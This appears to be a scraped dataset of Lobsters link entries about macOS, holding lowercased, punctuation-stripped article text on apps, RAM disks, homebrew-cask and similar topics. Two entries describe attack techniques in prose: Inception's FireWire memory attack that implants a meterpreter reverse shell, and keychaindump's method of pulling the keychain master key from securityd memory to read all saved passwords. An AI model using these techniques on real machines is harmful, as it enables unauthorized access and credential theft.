selfreporterlogin issue assigneelogin selfassigneelogin issue updatedat selfupdatedat issuetitle selftitle issuebody selfbody nsuinteger hash return selfnumberhash bool isequal ghissue issue issue iskindofclass ghissueclass return return selfnumber isequal issuenumber selftitle isequal issuetitle selfbody isequal issuebody end whew lot boilerplate something simple even problem example address url htmlurl field missing nsurl urlwithstring throw exception way update ghissue new data server way turn ghissue back json ghissuestate encoded asis enum change future existing archive might break interface ghissue change road existing archive might break use core data core data solves certain problem well need execute complex query across data handle huge object graph lot relationship support undo redo core data excellent fit however come pain point concurrency huge headache particularly difficult pas managed object thread nsmanagedobjectcontextconcurrencytypes introduced o x io really address problem instead object id passed around translated back forth highly inconvenient still lot boilerplate managed object reduce boilerplate seen core data plenty correctly setting core data stack persistent store persistent store coordinator executing fetch take many line code hard get right even experienced developer make mistake using core data framework forgiving trying access json object core data lot work little gain mtlmodel enter mtlmodel ghissue look like inheriting mtlmodel typedef enum nsuinteger ghissuestateopen ghissuestateclosed ghissuestate interface ghissue mtlmodel property nonatomic copy readonly nsurl url property nonatomic copy readonly nsurl htmlurl property nonatomic copy readonly nsnumber number property nonatomic assign readonly ghissuestate state property nonatomic copy readonly nsstring reporterlogin property nonatomic copy readonly nsstring assigneelogin property nonatomic copy readonly nsdate updatedat property nonatomic copy nsstring title property nonatomic copy nsstring body end implementation ghissue nsdateformatter dateformatter nsdateformatter dateformatter nsdateformatter alloc init dateformatterlocale nslocale alloc initwithlocaleidentifier enusposix dateformatterdateformat yyyymmddthh mm s z return dateformatter nsdictionary externalrepresentationkeypathsbypropertykey return superexternalrepresentationkeypathsbypropertykey mtldictionarybyaddingentriesfromdictionary url url htmlurl htmlurl reporterlogin userlogin assigneelogin assigneelogin updatedat updatedat nsvaluetransformer urltransformer return nsvaluetransformer valuetransformerforname mtlurlvaluetransformername nsvaluetransformer htmlurltransformer return nsvaluetransformer valuetransformerforname mtlurlvaluetransformername nsvaluetransformer statetransformer nsdictionary state open ghissuestateopen closed ghissuestateclosed return mtlvaluetransformer reversibletransformerwithforwardblock nsstring str return state str reverseblock nsnumber state return state allkeysforobject state lastobject nsvaluetransformer updatedattransformer return mtlvaluetransformer reversibletransformerwithforwardblock nsstring str return selfdateformatter datefromstring str reverseblock nsdate date return selfdateformatter stringfromdate date end notably absent version implementation nscoding nscopying isequal hash inspecting property declaration subclass mtlmodel provide default implementation method problem original example happen fixed well url htmlurl field missing nsurl urlwithstring throw exception url transformer used included mantle return nil given nil string way update ghissue new data server mtlmodel extensible mergevaluesforkeysfrommodel method make easy specify new model data integrated way turn ghissue back json ghissuestate encoded asis enum change future existing archive might break issue solved using reversible transformer ghissue externalrepresentation return json dictionary also get encoded encodewithcoder saving fragile enum value interface ghissue change road existing archive might break mtlmodel automatically save version model object used archival unarchiving migrateexternalrepresentation fromversion invoked migration needed giving convenient hook upgrade old data extension mantle also come miscellaneous crossplatform extension meant make life easier including assuredly run common pain point getting involved mantle still new moving fast may make breaking change timetotime excellent unit test coverage already used github mac production code heartily encourage check file issue find like contribute code take look readme enjoy
771,Lobsters,mac,Apple macOS,Disable scroll acceleration introduced in Mac OS 10.8 Mountain Lion,https://github.com/davekeck/DisableExtremeScrollAcceleration,disable scroll acceleration introduced mac o mountain lion,disableextremescrollacceleration note app user interface upon launch work background without appearing dock immediately quits download compiled app downloaded installation,disableextremescrollacceleration app disables new scroll acceleration introduced mac o mountain lion like might make rapid small scrolling gesture scanning document mountain lion changed scrolling behavior rapid gesture extreme acceleration occurs causing document scroll far usually intend app disables behavior note app user interface upon launch work background without appearing dock immediately quits download compiled app downloaded installation install app put safe place eg application set launched log using user group preference pane system preference
772,Lobsters,mac,Apple macOS,Inception - gain root on any machine you have physical access to,http://www.breaknenter.org/projects/inception/,inception gain root machine physical access,inception metasploit integration aliexpress save money using promo code check code github post navigation,inception metasploit integration quite quiet socalled blog lately adding new feature inception thought time small writeup last month completely restructured inception tool loosely coupled made easier create module exploiting dma later post also added one major functionality ability implant metasploit payload directly target memory stable fashion mean use inception implant payload available metasploit framework memory execute system privilege interaction required target machine plug firewire cable find aliexpress save money using promo code run inception pwn created quick video illustrate implant meterpreter reverse tcp shell target call back attacker machine pretty cool video proofofconcept work window target generates interest considering adding support os check code github post navigation
773,Lobsters,mac,Apple macOS,Hacking RAM: Fun with In-memory Disks,http://nathancahill.github.com/photoshop-in-memory-scratch-disk/,hacking ram fun inmemory disk,gskill theoretical readwrite speed portable apps puppy linux nathancahill,getting new macbook pro ram gskill apple highly recommended starting looking way put use one favorite hack mounting virtual disk portion ram create ram drive take advantage theoretical readwrite speed ram everything stored ram temporary disappear unmount reboot pretty simple run command terminal diskutil erasevolume hf ramdisk hdiutil attach nomount ram number end command number byte sector disk disk byte disk sector need run command every time restart computer drop automator app add startup item one great use ram drive use photoshop scratch disk played size little found sweet spot around might little big ram instead cool thing fast temporary disk store working copy large file instant access run portable apps entirely memory get small linux distro like puppy linux running vm entire operating system memory running ssd get even benefit storing stuff memory set log file write ssd along anything else writes drive frequently reduces number writes ssd boost longevity drive another cool use ram drive comment tweet nathancahill
774,Lobsters,mac,Apple macOS,brew-cask: a friendly homebrew CLI workflow for the administration of Mac apps,https://github.com/phinze/homebrew-cask,brewcask friendly homebrew cli workflow administration mac apps,homebrew cask homebrew let try homebrew learn usagemd contributingmd hackingmd documentation reporting bug ignore guide issue may closed without review search request question wan na chat license bsd clause netbsd license,homebrew cask install drag homebrew cask extends homebrew brings elegance simplicity speed installation management gui macos application atom google chrome providing friendly cli workflow administration macos application distributed binary let try start using homebrew cask need homebrew installed slower brew cask install atom satisfying dependency downloading http downloading http verifying checksum cask atom installing cask atom moving app atomapp applicationsatomapp linking binary apm usrlocalbinapm linking binary atomsh usrlocalbinatom atom successfully installed atom installed one quick command clicking dragging dropping learn find basic documentation using homebrew cask usagemd want contribute cask awesome see contributingmd want hack code also awesome see hackingmd projectrelated detail discussion available documentation reporting bug ignore guide issue may closed without review reporting bug run brew updatereset brew update try command fixall reset state tap ensuring problem outdated setup side issue persists search opening new one find open issue new information add comment find closed issue try solution issue still solved see guide common problem request question wan na chat really rather friendly best place talk project license code bsd clause netbsd license
775,Lobsters,mac,Apple macOS,Shortcat - Spotlight for the UI,http://shortcatapp.com,shortcat spotlight ui,click keyboard work apps productive use case,click keyboardshortcat unique application enables click without using mouse shortcat particularly suited fast typistsyou simply activate shortcat keyboard shortcut type letter match ui element want click shortcat search current active window menu bar matching elementssimply hit return click desired element work appsshortcat leverage accessibility api supported application come mac o x application finder safari xcode textual skype calendar supported shortcat constantly updated work better application productiveit take average three second move hand keyboard mouse clicking moving back keybordshortcat let keep hand keyboard click saving time energy imagine time could save use casesbelow list example shortcat used switching channel textualswitching chat skypeclicking link chat appschanging setting system preferencesbrowsing web safariusing apps within io simulatorswitching tab chromeand much much user discovering new us shortcat every day
776,Lobsters,mac,Apple macOS,Abusing Emoji in iOS and Your Mac,http://zachholman.com/posts/abusing-emoji/,abusing emoji io mac,setting general international keyboard add new computer name hostname airport extreme client time machine iphone ipad io setting name itunes playlist emoji io folder name password o x home directory hooray,like fourteenyearold japanese schoolchildren social circle silicon valley embraced usage emoji subset unicode us pretty picture letter easily tell story emoji example string emoji mean let go meet chipotle build nuclear fallout shelter pinto bean discarded burrito see emoji efficient apple support emoji last year admirable add emoji keyboard iphone ipad tapping setting general international keyboard add new o x lion mountain lion hit option command text box text area able drag drop character viewer naturally next step see far take computer name hostname know computer dick keep work piece shit better way show affection hunk metal rename literal steamy pile shit sharing preference pane set computer name machine let set piece poo file sharing turned machine proudly display emoji finder sidebar o x machine network run first problem o x smart enough set emoji actual hostname keep separate internal plaintext hostname alongside emoji name unfortunately set plaintext macintoshlocal know hard time attracting potential mate discover boring hostname setting emoji computer name sure click edit change something sure entice potential partner like ismelllikecheetoslocal airport extreme say two hardest problem computer science cache invalidation naming thing must emoji airport extreme home along airport express attached speaker decided emoji airport utility rename router see fit also name actual wifi network emoji serious problem though client use emoji name wifi network work great connect base station o x lion iphone ipad run diverse network going run problem snow leopard earlier example render emoji square box since o understand emoji lion xbox also render emoji seems connect fine appears window client refuse connect emoji network name might feature instead bug though time machine hard drive attached airport extreme use time machine name drive emoji character mac mount correctly spin indefinitely preparing backup phase likely run problem instead use time capsule iphone ipad io keystroke turn shiny expensive apple device shiny expensive apple device emoji name go setting name adjust show neatly itunes sidebar use emoji name itunes playlist example use last song added library top mostplayed song stingy use emoji io folder name use big ol warning sign reminder avoid showing couple internal github apps publicly wait ignore last bit password turn use emoji o x user password probably good idea entire civilization built bad idea oddly enough drag emoji password box single emoji show two character bring character palette password prompt though paste clipboard never able log account word perfect security o x home directory sure go wrong let create new user point o x figured probably think moron stop drag copy paste emoji account name box way create home directory nonlegal character time force issue create user vanilla account name right click sidebar select advanced option o x apparently cool emoji chose dress shirt nice necktie one suspect mildmannered office worker surprisingly enough o x take one look respectable necktie say yeah sure look good full windsor click ok certainly something go wrong point o x chug along creates user log switch user behold beautiful sight eye ever seen emoji menu bar l issue emoji file bash seems handle thing okayish note terminalapp support emoji new mountain lion finder contrast seems care one bit playing around bit look like o x handled like champ nothing overtly crashed process amuck activity monitor recommend serious technologist move home directory earliest convenience hooray really hope newfound knowledge feel confident enough go venture world accomplish nothing value
778,Lobsters,mac,Apple macOS,From Linux to OSX - 1 Year Later,http://batsov.com/articles/2012/09/09/from-linux-to-osx-1-year-later/,linux osx year later,prelude linux desktop experience killing linux desktop linux o x homebrew blazingly thing love o x desktop o x flavored apps sparrow parallel desktop hardware compatibility stability thing ok default apps mac app store emacs software development system administration thing hate special key da keyboard ultimate standard mighty package manager ugly xml config file xml config file xcode separately epilogue much darkness definitely p updated original post bit reflect initial feedback received,prelude little year ago wrote rant post linux desktop experience killing linux desktop first time year desktop linux user anymore spent month wrestling window let face window ill suited professional ruby programmer like ill suited programmer except maybe java net guess anyways never intention stick window mac due diligence year o x usage like share thing experience thus far linux o x transition initially painful felt odd dragging app icon application folder install honest quite puzzled supposed first time install app way helpful hint arrow apps linux distro package management definitely infinitely better least seems standing luckily tool use available thirdparty homebrew package manager o x like extremely basic version mighty gentoo portage generally get job done positive note impressed quality responsiveness o x desktop fact emacs keybindings used default editor toolkit strangely puzzled lack right control key one supposed hit control dare ask one app particular spotlight blew water especially dealt linux crappy clone like beagle past spotlight truly find anything sqllike query language blazingly fast quickly found good terminal emulator would actually best terminal emulator world imho commandline apps used day day already lying around o x unix great surprise even stuff like postgresql o x server zsh came preinstalled apps really needed native o x port others worthy alternative hated openofficeorg many year pleasantly surprised quality apps like keynote word keyboard chap preaching church da keyboard bit underwhelmed whole multitouch mumbojumbo first came conclusion apple trackpads mouse actually worth using even though still like using keyboard way sum got speed fairly quickly bumpy ride bit thing love o x desktop pretty quick stable make look like school project comparison mention font o x even prettier one window o x flavored apps sparrow first desktop mail client ever liked shame google killing ultimate terminal emulator alone warrant purchase mac keynote best presentation program come use thus far parallel desktop light year ahead virtualbox kvm far desktop virtualization concerned could go lot like stop obvious mac user developed taste extremely refined software hardware compatibility something supposed work o x work superbly outofthebox almost forgotten day constant battle crappy hardware sleep wake work battery life exceptional due advanced power management capability certainly controlling hardware o run help lot still acknowledge apple achievement stability one year three mac two three system crash developer like tinker little bit impressive said linux desktop used run half year without reboots reboots often caused power outage distrokernel update linux stability fairly new laptop well whole different thing ok default apps apps bundled o x bad particularly great still safari good browser mail much better desktop client evolutionthunderbird calendar good organizer bit buggy come google calendar integration message soso bottom line go long way bundled apps exactly perfect advice shop alternative opensource proprietary mac app store decent way distribute proprietary apps restriction app sandboxing many interesting apps hopefully get better time ability upgrade o x purchasing new version app store cool proprietary o course emacs cocoa port emacs bit immature visual glitch try mx linummode instance forgivable also missing deep integration emacs linux fuck designed official mac keyboard without right control key finally understood many mac user vim btw remapping cap control answer linux well simply supposed hit control key hand disruptive probably typing full sized keyboard software development o x nurture software development much linux come pretty close second place tool know love available installation setup little bit involved o x reason screenshots programming book show o x system administration definitely step back linux program like launchctl instance exactly fun work get job done never use o x box anything desktop workstation setting sensible path trivial linux either etcpaths plist forgotten come mind thing hate special key exactly o x feature one year still hate command option option basically alt strange location command totally useless imho probably hated much room left apple keyboard expect course old wired apple keyboard addition control key luckily use external da keyboard ultimate command option value probably would appreciated come cost beloved right control guess emacs user missing anyways standard mighty package manager linux aptitude yum portage pacman amazing o x homebrew decent option far cry might magic linux package manager still homebrew better alternative beware ugly xml config file o x write appalling xml config file thought never see like put java development behind xcode need install giant lame ide get bunch command line development tool one annoying thing encountered uptodate o x yep know tool available separately couple month requesting apple developer registration get seems bit much epilogue happier without linux definitely o x better o linux absolutely much better desktop experience since spend time computer interacting desktop big win course mind seeing linux achieve level desktop maturity stability dump linux join darkness hell know sharing two cent happy using linux definitely stick obviously many alternative lying around deal hardware problem immature desktop apps like breath fresh air compensates shortcoming o x nothing compensates lack right control key keyboard o problem great vibrant hacker community gathered around o x one main driving force o unfortunately lot corporate pressure apple well already know never perfect thing always compromise rather use proprietary o stay way free o bump every turn soon blog little bit practical aspect implication migration cheer mate p updated original post bit reflect initial feedback received
779,Lobsters,mac,Apple macOS,Breaking into the OS X Keychain,http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain,breaking o x keychain,update proofofconcept keychain extra step situation attack matt johnston source code keychaindump github pizzaandramen comment powered disqus blog comment powered,update want clear misconception security bug o x everything work designed point post show postexploitation technique release tool job found particular technique interesting instantaneous reliable across o x version requires persistent change systemtl dr root read plaintext keychain password loggedin user o x open source proofofconceptthere design compromise apple keychain implementation sacrifice security lot usabilityas result root user able read keychain secret loggedin user unless take extra step protect sure apple perfectly aware security implication made bargain intentionallybecause intentional design decision instead security bug exploitation come surprise however seen anyone actually use mention practical method publicthe situationin o x keychain contains saved password includes email account mail password stored safari credential accessing known wifi network contains valuable secret keychain encrypted opened login passwordbut twist log o x operating system automatically unlocks keychain convenience mean enter login password every time want use stored passwordsthat default see keychain dialog like thisinstead thisnotice one asks password user probably much happier nopasswordneeded dialog apple implemented course mean somehow possible read keychain password even without asking login password every time unlocking mean hereso password encrypted keep safe readable o x keep happy bit dilemma apple solution threefoldunlocking change keychain file plaintext password appear disk memory even unlockedapple provides official api reading unlocked password even though allow read also asks user permission dialog windowwhat unlocking actually unlocked password accessed documented security lackofdocumentationthe attackthe password keychain file encrypted many time various different key key encrypted using key stored file russiandoll fashion key open outermost doll kickstart whole decryption cascade derived user login password using call key master keyif anyone want read content keychain file know either user login password master key mean securityd process handle keychain operation o x know least one secretsi put observation test laptopscanning securityd whole memory space reveal copy login password next used login password get master key scanning memory perfect copy master key found securityd heapthis lead next question master key indeed stored securityd memory good way find testing every possible sequence memory space elegantinstead fully inspecting securityd whole memory space possible master key pinpointed couple identifying feature stored securityd heap area flagged malloctiny vmmap area memory also always structure pointing master key structure contains size field value hex pointer actual datathe search rather simple find securityd malloctiny heap area vmmapsearch found area occurrence next value pointer current heap area treat pointedto data possible master keywith kind pattern recognition number possible master key reduced candidate used try decrypt next key call wrapping key real master key spit sensible value wrapping key foolproof method low number candidate seems good enough run single false positive yetthe rest decryption process rather tedious master key reveals wrapping key hardcoded obfuscation key reveals encrypted credential key wrapping key reveals credential key credential key finally reveals plaintext password glory matt johnston research decryption stepshere sample run truncated output actual password usernames replaced x sudo keychaindump searching process heap range searching process heap range searching process heap range searching process heap range found master key candidate trying decrypt wrapping key usersjuusosalonenlibrarykeychainsloginkeychain trying master key candidate trying master key candidate trying master key candidate trying master key candidate trying master key candidate trying master key candidate trying master key candidate trying master key candidate trying master key candidate trying master key candidate found master key found wrapping key xxxxxxx xxxxxxx newsycombinatorcom xxxxxxx xxxxxxx gmailcom loginfacebookcom xxxxxxx xxxxxxx gmailcom smtpgooglecom xxxxxxx xxxxxxx gmailcom imapgooglecom xxxxxxx xxxxxxx gmailcom apiherokucom xxxxxxx xxxxxxx wwwfreechessorg xxxxxxx xxxxxxx twittercom xxxxxxx xxxxxxx gmailcom wwwgooglecom xxxxxxx xxxxxxx imapgmailcom xxxxxxx find source code keychaindump github proofofconcept far perfect list possible keychain secret seems work okay tested o x lion mountain lionpizzaandramen liked please enable javascript view comment powered disqusblog comment powered
